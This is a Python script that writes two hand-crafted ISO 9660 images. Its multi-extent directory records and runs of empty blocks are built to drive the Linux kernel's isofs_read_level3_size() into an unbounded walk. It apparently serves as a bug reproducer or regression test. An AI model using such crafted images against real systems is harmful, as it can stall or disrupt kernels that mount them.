#!/usr/bin/env python3
"""Build two small ISO 9660 images that trigger an unbounded walk in the
kernel's isofs_read_level3_size() (fs/isofs/inode.c).

Both images use a "level 3" (multi-extent) file: ECMA-119 lets a file be
split into several extents, each described by its own directory record; all
records but the last have the 0x80 continuation flag set.  The reader keeps
following the chain -- record, then next block, then next record -- until it
sees a non-continuation record.  Nothing bounds how many *empty* directory
blocks (a block whose first byte is a zero length, meaning "nothing here,
try the next block") the walk may cross before it gives up, so a crafted
image can make it walk arbitrarily far.

This is stdlib-only (no xorriso/genisoimage): those tools split a file into
multiple extents only above 4 GiB, so a hand-rolled writer is the only way
to get a multi-extent file a few kilobytes long.

On-disk layout used throughout (ECMA-119 numbers):
  block 16     Primary Volume Descriptor
  block 17     Volume Descriptor Set Terminator
  block 18/19  L and M path tables (root directory only, single entry)
  block 20..   root directory (one or more 2048-byte blocks)
  after that   file data, one or more blocks per extent

Directory records never straddle a block boundary; a block's unused tail is
zero, and a zero length byte there means "skip to the next block".
"""
import struct
import sys

BS = 2048       # logical block size
DIR_LBA = 20    # first block of the root directory


def both16(v):
    """A 16-bit field stored both little- and big-endian, per ECMA-119."""
    return struct.pack('<H', v) + struct.pack('>H', v)


def both32(v):
    """A 32-bit field stored both little- and big-endian, per ECMA-119."""
    return struct.pack('<I', v) + struct.pack('>I', v)


def reclen(name_len):
    """Directory record length for a name of this many bytes (ECMA-119
    9.1.1..9.1.5): fixed 33-byte header, the name, and a padding byte if the
    name length is even (so the record stays an even length)."""
    return 33 + name_len + (1 if name_len % 2 == 0 else 0)


def dirrec(name, lba, size, flags):
    """One ECMA-119 9.1 directory record: name is bytes, lba/size are the
    extent this record describes, flags bit 0x80 means "more extents
    follow"."""
    nl = len(name)
    ln = reclen(nl)
    r = bytearray(ln)
    r[0] = ln                      # length of this record
    r[2:10] = both32(lba)          # extent location
    r[10:18] = both32(size)        # extent size (this section only)
    r[18:25] = bytes([126, 9, 22, 12, 0, 0, 0])  # recording date/time
    r[25] = flags                  # bit 0x80 = not the final section
    r[28:32] = both16(1)           # volume sequence number
    r[32] = nl                     # name length
    r[33:33 + nl] = name
    return bytes(r)


class Image:
    """Builds one root directory of `dir_blocks` blocks, plus whatever file
    data has been added, into a single ISO 9660 image."""

    def __init__(self, dir_blocks):
        self.dir_blocks = dir_blocks
        self.data_next = DIR_LBA + dir_blocks
        self.data = {}                              # lba -> bytes
        self.blocks = [[] for _ in range(dir_blocks)]  # records per dir block
        # '.' and '..': patched to their final size in build()
        self.blocks[0] = [(b'\x00', DIR_LBA, dir_blocks * BS, 2),
                           (b'\x01', DIR_LBA, dir_blocks * BS, 2)]

    def alloc(self, content):
        """Reserve the next free block(s) for `content` and return their
        starting block number."""
        lba = self.data_next
        nblk = max(1, (len(content) + BS - 1) // BS)
        self.data[lba] = content
        self.data_next += nblk
        return lba

    def add_file(self, blk, name, content):
        """A single-extent file, its one directory record in block `blk`."""
        lba = self.alloc(content)
        self.blocks[blk].append((name, lba, len(content), 0))

    def add_multi(self, name, record_blocks, extent_sizes, tag):
        """A multi-extent file: one directory record per entry of
        `extent_sizes`, placed in the directory blocks named by
        `record_blocks` (same length, one per record).  All but the last
        record get the 0x80 "more extents follow" flag."""
        for i, size in enumerate(extent_sizes):
            # distinct, position-dependent filler bytes per extent -- the
            # content itself is irrelevant to the bug, only its length is
            ext = bytes(((tag * 31 + i * 17 + j * 7 + (j >> 8)) & 0xFF)
                        for j in range(size))
            lba = self.alloc(ext)
            last = i == len(extent_sizes) - 1
            flags = 0 if last else 0x80
            self.blocks[record_blocks[i]].append((name, lba, size, flags))

    def build(self, path, keep_empty_dir_blocks=False):
        """Write the image to `path`.  The declared directory size normally
        stops at the last block that holds a record; keep_empty_dir_blocks
        keeps it at the full `dir_blocks`, so that trailing empty blocks are
        still nominally "inside" the directory."""
        used = max(i for i, b in enumerate(self.blocks) if b) + 1
        dsize = (self.dir_blocks if keep_empty_dir_blocks else used) * BS
        self.blocks[0][0:2] = [(b'\x00', DIR_LBA, dsize, 2),
                                (b'\x01', DIR_LBA, dsize, 2)]

        nblocks = self.data_next
        img = bytearray(nblocks * BS)
        for bi, recs in enumerate(self.blocks):
            off = 0
            for name, lba, size, flags in recs:
                rec = dirrec(name, lba, size, flags)
                assert off + len(rec) <= BS, 'record would straddle a block'
                start = (DIR_LBA + bi) * BS + off
                img[start:start + len(rec)] = rec
                off += len(rec)
        for lba, content in self.data.items():
            img[lba * BS:lba * BS + len(content)] = content

        # Primary Volume Descriptor (ECMA-119 8.4)
        pvd = bytearray(BS)
        pvd[0] = 1
        pvd[1:6] = b'CD001'
        pvd[6] = 1
        pvd[8:40] = b'LINUX'.ljust(32)
        pvd[40:72] = b'TIGHT'.ljust(32)
        pvd[80:88] = both32(nblocks)
        pvd[120:124] = both16(1)                 # volume set size
        pvd[124:128] = both16(1)                 # volume sequence number
        pvd[128:132] = both16(BS)                # logical block size
        pvd[132:140] = both32(10)                 # path table size
        pvd[140:144] = struct.pack('<I', 18)      # L path table location
        pvd[148:152] = struct.pack('>I', 19)      # M path table location
        pvd[156:190] = dirrec(b'\x00', DIR_LBA, dsize, 2)  # root dir record
        for o, ln in ((190, 128), (318, 128), (446, 128), (574, 128),
                      (702, 37), (739, 37), (776, 37)):
            pvd[o:o + ln] = b' ' * ln            # volume/publisher/etc ids
        for o in (813, 830, 847, 864):
            pvd[o:o + 17] = b'2026092212000000\x00'  # volume date/times
        pvd[881] = 1                              # file structure version
        img[16 * BS:17 * BS] = pvd

        term = bytearray(BS)                      # Volume Descriptor Set
        term[0] = 255                              # Terminator
        term[1:6] = b'CD001'
        term[6] = 1
        img[17 * BS:18 * BS] = term

        # L and M path tables: one entry, the root directory
        img[18 * BS:18 * BS + 10] = (bytes([1, 0]) + struct.pack('<I', DIR_LBA)
                                      + struct.pack('<H', 1) + b'\x00\x00')
        img[19 * BS:19 * BS + 10] = (bytes([1, 0]) + struct.pack('>I', DIR_LBA)
                                      + struct.pack('>H', 1) + b'\x00\x00')

        with open(path, 'wb') as f:
            f.write(img)


def build_empty_gap(path, gap):
    """empty-gap-<gap>.iso: a root directory of a single declared block,
    holding one small file "Z;1" and the FIRST record of a multi-extent
    file "A;1" (0x80-flagged; ISO 9660 file names carry a ";version"
    suffix that the kernel strips, so this shows up as "z" and "a").
    `gap` all-zero blocks follow, then a block with "a"'s final record.
    The directory's declared size is patched down to one block afterwards,
    so an ordinary directory listing never reaches the tail -- only a
    direct lookup of "a" walks the chain, and that walk is what has to
    cross the `gap` empty blocks."""
    dir_blocks = gap + 2
    im = Image(dir_blocks)
    im.add_file(0, b'Z;1', b'zzz' * 100)
    im.add_multi(b'A;1', [0, gap + 1], [4096, 1000], 15)
    im.build(path, keep_empty_dir_blocks=True)

    with open(path, 'r+b') as f:
        img = bytearray(f.read())
        b0 = DIR_LBA * BS
        # patch '.', '..' and the PVD's root record down to one real block
        for pos in (b0 + 10, b0 + 34 + 10, 16 * BS + 156 + 10):
            img[pos:pos + 8] = both32(BS)
        f.seek(0)
        f.write(img)


def build_mixed(path, sections, empty):
    """mixed-<sections>-<empty>.iso: a multi-extent file "A;1" (shown as
    "a" once the kernel strips its ";version" suffix) with `sections`
    records, an empty (all-zero) directory block inserted after each of the
    first `empty` section-to-section transitions.  Unlike empty-gap, the
    directory's declared size covers the whole record chain here, so an
    ordinary directory listing does reach "a" -- the point of this image is
    that `sections` alone stays under a "at most 100 sections" limit, and
    only counting the interleaved empty blocks too pushes the combined
    total over it."""
    record_blocks = [0]
    cur = 0
    gaps = 0
    for _ in range(1, sections):
        cur += 1
        if gaps < empty:
            cur += 1  # this block is left with no record: it stays empty
            gaps += 1
        record_blocks.append(cur)
    assert gaps == empty

    dir_blocks = record_blocks[-1] + 1
    im = Image(dir_blocks)
    extent_sizes = [50 + i for i in range(sections)]
    im.add_multi(b'A;1', record_blocks, extent_sizes, 42)
    im.build(path)


if __name__ == '__main__':
    if len(sys.argv) != 3:
        sys.exit('usage: gen.py <empty-gap.iso> <mixed.iso>')
    build_empty_gap(sys.argv[1], 150)
    build_mixed(sys.argv[2], sections=60, empty=50)
    print('wrote', sys.argv[1], 'and', sys.argv[2])
